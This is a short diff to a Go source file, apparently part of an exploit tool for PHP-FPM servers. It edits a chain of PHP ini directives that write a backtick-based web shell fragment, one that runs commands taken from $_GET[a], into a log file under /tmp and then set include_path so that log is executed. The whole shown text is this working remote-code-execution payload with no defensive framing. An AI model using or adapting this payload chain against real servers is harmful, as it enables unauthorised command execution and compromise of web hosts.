@@ -7,15 +7,17 @@ import (
 )
 
 var chain = []string{
+	"error_reporting=2",
 	"short_open_tag=1",
 	"html_errors=0",
-	"include_path=/tmp",
-	"auto_prepend_file=a",
 	"log_errors=1",
-	"error_reporting=2",
-	"error_log=/tmp/a",
-	"extension_dir=\"<?=`\"",
-	"extension=\"$_GET[a]`?>\"",
+	"output_handler=<?/*",
+	"output_handler=*/`",
+	"output_handler=''",
+	"extension_dir='`?>'",
+	"extension=$_GET[a]",
+	"error_log  = /tmp/l",
+	"include_path=/tmp",
 }
 
 const (
